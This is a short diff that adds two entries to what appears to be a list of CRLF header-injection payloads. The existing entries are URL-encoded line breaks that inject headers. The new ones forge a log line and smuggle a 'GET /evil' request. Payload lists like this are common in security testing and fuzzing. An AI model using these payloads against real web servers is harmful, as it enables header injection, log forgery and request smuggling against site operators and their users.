@@ -12,3 +12,5 @@
 %0d%0aX-Injected-Header:%20AttackValue
 %0d%0aX-Injected-Header: 1%0d%0aContent-Security-Policy: default-src 'none'
 %0d%0aX-Injected-Header: 1%0d%0aX-Frame-Options: DENY
+%0d%0a#LOG:INJECTED
+%0d%0aGET /evil HTTP/1.1
